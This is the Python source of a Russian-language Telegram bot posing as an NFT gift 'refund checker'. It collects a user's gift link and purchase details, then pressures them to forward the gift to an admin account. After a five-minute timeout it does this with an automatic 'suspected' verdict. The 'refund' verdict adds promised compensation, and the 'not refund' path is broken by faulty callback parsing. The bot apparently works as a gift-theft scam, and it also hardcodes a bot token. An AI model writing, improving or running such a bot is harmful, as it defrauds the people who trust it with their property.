import asyncio
import warnings
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, \
    ConversationHandler, ContextTypes
from telegram.warnings import PTBUserWarning

warnings.filterwarnings("ignore", category=PTBUserWarning)

# ========== НАСТРОЙКИ ==========
BOT_TOKEN = "8705781672:AAGDPPZ9iYnuWfpbOsWChVws1oqnGBwiBmE"
ADMIN_ID = 8347013883
ADMIN_USERNAME = "@giftgiveaways_admin"
SUPPORT_BOT = "@giftgiveawayssupportbot"

# Таймаут ожидания ответа админа (5 минут = 300 секунд)
ADMIN_TIMEOUT_SECONDS = 300

# ========== ВОПРОСЫ ==========
QUESTIONS = [
    "Когда примерно был создан аккаунт?",
    "Где покупали или у кого покупали подарок?",
    "За какую валюту покупали подарок?",
    "Подарок был куплен у человека или у робота?",
    "Когда примерно был куплен подарок?"
]

# ========== СОСТОЯНИЯ ==========
ASK_LINK, ASK_REF, ASK_Q = range(3)
users = {}


# ========== ГЛАВНОЕ МЕНЮ ==========
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🎁 ПРОВЕРИТЬ ПОДАРОК", callback_data="check")],
        [InlineKeyboardButton("❓ ЧТО ТАКОЕ РЕФАУНД", callback_data="refund")],
        [InlineKeyboardButton("👑 ЗАЧЕМ ПЕРЕДАВАТЬ АДМИНУ?", callback_data="why")],
        [InlineKeyboardButton("🆘 ПОДДЕРЖКА", callback_data="support")],
        [InlineKeyboardButton("ℹ️ О БОТЕ", callback_data="about")]
    ])
    await update.message.reply_text(
        "🎁 GIFT CHECKER\nпроверка подарков\n\n👇 Выберите действие:",
        reply_markup=kb
    )


async def menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data

    if data == "check":
        await q.edit_message_text(
            "🎁 ПРОВЕРКА ПОДАРКА\n\n"
            "Шаг 1 из 7\n\n"
            "Отправьте ссылку на ваш NFT-подарок:"
        )
        return ASK_LINK

    elif data == "refund":
        await q.edit_message_text(
            "🔄 ЧТО ТАКОЕ РЕФАУНД?\n\n"
            "Рефаунд - возврат средств за подарок, который:\n"
            "- не открывается\n"
            "- не пересылается\n"
            "- куплен у мошенников\n\n"
            f"📩 Поддержка: {SUPPORT_BOT}"
        )
        return ConversationHandler.END

    elif data == "why":
        await q.edit_message_text(
            "👑 ЗАЧЕМ ПЕРЕДАВАТЬ АДМИНУ?\n\n"
            "Администратор проверит транзакции и метаданные.\n\n"
            f"👤 {ADMIN_USERNAME}"
        )
        return ConversationHandler.END

    elif data == "support":
        await q.edit_message_text(
            "🆘 ПОДДЕРЖКА\n\n"
            f"🤖 Бот: {SUPPORT_BOT}\n"
            f"👑 Админ: {ADMIN_USERNAME}\n\n"
            "Время ответа: до 5 минут"
        )
        return ConversationHandler.END

    elif data == "about":
        await q.edit_message_text(
            "ℹ️ О БОТЕ\n\n"
            "Gift Checker v4.0\n"
            "Вердикт выносит администратор.\n\n"
            f"📩 По вопросам: {SUPPORT_BOT}"
        )
        return ConversationHandler.END
    return ConversationHandler.END


# ========== ОПРОС ==========
async def get_link(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    users[uid] = {
        "link": update.message.text,
        "answers": [],
        "idx": 0,
        "chat_id": update.effective_chat.id,
        "username": update.effective_user.username or str(uid),
        "first_name": update.effective_user.first_name or "",
        "verdict_sent": False,
        "admin_responded": False
    }
    await update.message.reply_text(
        "✅ Ссылка принята!\n\n"
        "Шаг 2 из 7\n\n"
        "Укажите username человека, от которого вы пришли:"
    )
    return ASK_REF


async def get_ref(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in users:
        await update.message.reply_text("Ошибка. Нажмите /start")
        return ConversationHandler.END
    users[uid]["ref"] = update.message.text.strip().lstrip('@')
    await update.message.reply_text(
        f"✅ Реферер: @{users[uid]['ref']}\n\n"
        f"Шаг 3 из {len(QUESTIONS) + 2}\n\n"
        f"Вопрос 1/{len(QUESTIONS)}:\n{QUESTIONS[0]}\n\n"
        f"Отправьте ответ:"
    )
    return ASK_Q


async def handle_q(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in users:
        await update.message.reply_text("Ошибка. /start")
        return ConversationHandler.END
    u = users[uid]
    idx = u["idx"]
    u["answers"].append({"q": QUESTIONS[idx], "a": update.message.text})

    if idx + 1 < len(QUESTIONS):
        u["idx"] += 1
        await update.message.reply_text(
            f"✅ Принято!\n\n"
            f"Вопрос {idx + 2}/{len(QUESTIONS)}:\n{QUESTIONS[idx + 1]}\n\n"
            f"Отправьте ответ:"
        )
        return ASK_Q
    else:
        await update.message.reply_text(
            "📋 ЗАЯВКА ПРИНЯТА\n\n"
            "✅ Спасибо! Ваши данные переданы администратору.\n"
            "⏳ Ожидайте решения (обычно до 5 минут)."
        )

        # Формируем ответы для админа
        answers_text = "\n".join([f"{i + 1}. {a['q']}\n   -> {a['a']}" for i, a in enumerate(u["answers"])])

        # Кнопки для админа
        admin_kb = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("✅ РЕФАУНД", callback_data=f"verdict_refund_{uid}"),
                InlineKeyboardButton("❌ НЕ РЕФАУНД", callback_data=f"verdict_not_refund_{uid}")
            ],
            [InlineKeyboardButton("⏳ ПОДОЗРЕВАЕТСЯ", callback_data=f"verdict_suspect_{uid}")]
        ])

        admin_msg = (
            f"🆕 НОВАЯ ЗАЯВКА НА ПРОВЕРКУ\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 От: @{u['username']} ({u['first_name']})\n"
            f"🔗 Реферер: @{u['ref']}\n"
            f"🔗 Ссылка: {u['link']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📝 ОТВЕТЫ:\n{answers_text}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ У вас {ADMIN_TIMEOUT_SECONDS // 60} минут на решение."
        )

        await ctx.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, reply_markup=admin_kb)

        # Запускаем таймер на 5 минут
        asyncio.create_task(admin_timeout(uid, ctx))

        return ConversationHandler.END


# ========== ТАЙМЕР АДМИНА ==========
async def admin_timeout(uid, ctx):
    """Если админ не ответил за 5 минут - отправляем пользователю вердикт 'ПОДОЗРЕВАЕТСЯ'"""
    await asyncio.sleep(ADMIN_TIMEOUT_SECONDS)

    if uid not in users:
        return

    u = users[uid]

    # Если админ уже ответил - ничего не делаем
    if u.get("admin_responded", False):
        return

    # Если вердикт уже отправлен - ничего не делаем
    if u.get("verdict_sent", False):
        return

    u["verdict_sent"] = True

    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🆘 НАПИСАТЬ В ПОДДЕРЖКУ", url=f"https://t.me/{SUPPORT_BOT[1:]}")]
    ])

    verdict_text = (
        "🔴 ВЕРДИКТ БОТА (АВТОМАТИЧЕСКИЙ) 🔴\n\n"
        "⏳ Администратор не успел ответить в течение 5 минут.\n\n"
        "⚠️ Ваш подарок ПОДОЗРЕВАЕТСЯ рефаундом.\n\n"
        "Что делать:\n"
        "1. Перешлите подарок админу:\n"
        f"   {ADMIN_USERNAME}\n"
        "2. Укажите хэштег: #проверкарефаунда\n"
        "3. Дождитесь ответа (обычно 3-5 минут)\n\n"
        "Если вы не согласны - напишите в поддержку:"
    )

    await ctx.bot.send_message(chat_id=u["chat_id"], text=verdict_text, reply_markup=kb)

    # Уведомляем админа, что вердикт ушёл автоматически
    await ctx.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"⏳ Пользователю @{u['username']} автоматически отправлен вердикт «ПОДОЗРЕВАЕТСЯ» (таймаут 5 минут)."
    )


# ========== ОБРАБОТКА ВЕРДИКТА ОТ АДМИНА ==========
async def handle_admin_verdict(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Обработка нажатия кнопок админа (рефаунд / не рефаунд / подозревается)"""
    query = update.callback_query
    await query.answer()

    if update.effective_user.id != ADMIN_ID:
        await query.edit_message_text("⛔ Доступ запрещён.")
        return

    data = query.data
    # Формат: verdict_refund_123456789 или verdict_not_refund_123456789 или verdict_suspect_123456789
    parts = data.split("_")
    if len(parts) < 3:
        return

    verdict_type = parts[1]  # refund, not_refund, suspect
    uid = int(parts[2])

    if uid not in users:
        await query.edit_message_text("❌ Пользователь не найден в базе.")
        return

    u = users[uid]
    u["admin_responded"] = True

    # Отмечаем, что вердикт отправлен
    u["verdict_sent"] = True

    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🆘 НАПИСАТЬ В ПОДДЕРЖКУ", url=f"https://t.me/{SUPPORT_BOT[1:]}")]
    ])

    if verdict_type == "refund":
        verdict_text = (
            "🔴 ВЕРДИКТ АДМИНИСТРАТОРА 🔴\n\n"
            "ВНИМАНИЕ! Данный подарок является РЕФАУНДОМ!\n\n"
            "Что нужно сделать:\n"
            "1. Перешлите этот подарок админу:\n"
            f"   {ADMIN_USERNAME}\n"
            "2. Обязательно укажите хэштег:\n"
            "   #проверкарефаунда\n"
            "3. Дождитесь ответа (3-5 минут)\n\n"
            "Бот автоматически вернёт подарок и компенсирует 25 звёзд.\n\n"
            "Если вы НЕ СОГЛАСНЫ с решением - напишите в поддержку:"
        )
        await ctx.bot.send_message(chat_id=u["chat_id"], text=verdict_text, reply_markup=kb)
        await query.edit_message_text(f"✅ Пользователю @{u['username']} отправлен вердикт: РЕФАУНД")

    elif verdict_type == "not_refund":
        verdict_text = (
            "🟢 ВЕРДИКТ АДМИНИСТРАТОРА 🟢\n\n"
            "✅ Ваш подарок НЕ является рефаундом.\n\n"
            "Подарок валидный, можете использовать или продавать.\n\n"
            "Спасибо, что воспользовались нашим сервисом!"
        )
        await ctx.bot.send_message(chat_id=u["chat_id"], text=verdict_text)
        await query.edit_message_text(f"✅ Пользователю @{u['username']} отправлен вердикт: НЕ РЕФАУНД")

    elif verdict_type == "suspect":
        verdict_text = (
            "🟡 ВЕРДИКТ АДМИНИСТРАТОРА 🟡\n\n"
            "⚠️ Ваш подарок ПОДОЗРЕВАЕТСЯ рефаундом.\n\n"
            "Что делать:\n"
            "1. Перешлите подарок админу:\n"
            f"   {ADMIN_USERNAME}\n"
            "2. Укажите хэштег: #проверкарефаунда\n"
            "3. Дождитесь ответа (3-5 минут)\n\n"
            "Если вы не согласны - напишите в поддержку:"
        )
        await ctx.bot.send_message(chat_id=u["chat_id"], text=verdict_text, reply_markup=kb)
        await query.edit_message_text(f"✅ Пользователю @{u['username']} отправлен вердикт: ПОДОЗРЕВАЕТСЯ")

    # Отправляем админу лог с ответами пользователя (на всякий случай)
    answers_text = "\n".join([f"{i + 1}. {a['q']}\n   -> {a['a']}" for i, a in enumerate(u["answers"])])
    log_msg = (
        f"📋 ДАННЫЕ ПОЛЬЗОВАТЕЛЯ\n"
        f"Ссылка: {u['link']}\n"
        f"От: @{u['username']}\n"
        f"Реферер: @{u['ref']}\n"
        f"Ответы:\n{answers_text}"
    )
    await ctx.bot.send_message(chat_id=ADMIN_ID, text=log_msg)

    # Чистим данные пользователя через 10 секунд
    async def cleanup():
        await asyncio.sleep(10)
        if uid in users:
            del users[uid]

    asyncio.create_task(cleanup())


async def cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in users:
        del users[uid]
    await update.message.reply_text("❌ Опрос отменён. /start для возврата в меню")


async def admin_reply(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    args = ctx.args
    if len(args) < 2:
        await update.message.reply_text("Использование: /reply @username текст")
        return
    target = args[0].lstrip('@')
    text = " ".join(args[1:])
    for uid, data in users.items():
        if data["username"] == target:
            await ctx.bot.send_message(
                chat_id=data["chat_id"],
                text=f"👑 ОТВЕТ АДМИНИСТРАТОРА:\n\n{text}\n\n/start для возврата в меню"
            )
            await update.message.reply_text(f"✅ Отправлено @{target}")
            return
    await update.message.reply_text(f"❌ @{target} не найден")


# ========== ЗАПУСК ==========
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(menu, pattern="^check$")],
        states={
            ASK_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_link)],
            ASK_REF: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ref)],
            ASK_Q: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_q)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(menu, pattern="^(refund|why|support|about)$"))
    app.add_handler(CallbackQueryHandler(handle_admin_verdict, pattern="^verdict_"))
    app.add_handler(conv)
    app.add_handler(CommandHandler("reply", admin_reply))

    print("✅ Бот ЗАПУЩЕН")
    print(f"👑 Админ: {ADMIN_USERNAME}")
    print(f"⏳ Таймаут ответа админа: {ADMIN_TIMEOUT_SECONDS // 60} минут")
    app.run_polling()


if __name__ == "__main__":
    main()
